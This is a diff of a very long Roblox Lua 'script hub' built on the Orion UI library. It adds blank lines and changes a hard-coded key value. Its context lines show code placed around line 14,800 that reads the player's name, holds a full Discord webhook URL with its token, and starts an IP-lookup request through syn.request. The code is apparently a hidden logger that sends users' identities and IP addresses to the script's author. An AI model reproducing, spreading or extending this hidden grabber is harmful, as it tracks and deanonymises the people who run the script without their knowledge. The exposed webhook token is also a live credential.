@@ -14846,6 +14846,12 @@
 
 
 
+
+
+
+
+
+
 local name = game:GetService("Players").LocalPlayer.Name
 local WebhookURL = "https://discord.com/api/webhooks/1054500209637466162/WguwbwIpxsGoWXZtsntlxGQq8AAoMLKcErqoVKbcKsYgeaifjOVG12A7q6hAx_-a1MzD"
 local getIPResponse = syn.request({
@@ -14901,7 +14907,7 @@ OrionLib:MakeNotification({
 	Time = 5
 })
 
-_G.Key = "EXPRMMKFM" -- You Put Your Key Here
+_G.Key = "X3453WREWR" -- You Put Your Key Here
 _G.KeyInput = "string"
 
 function MakeScriptHub()
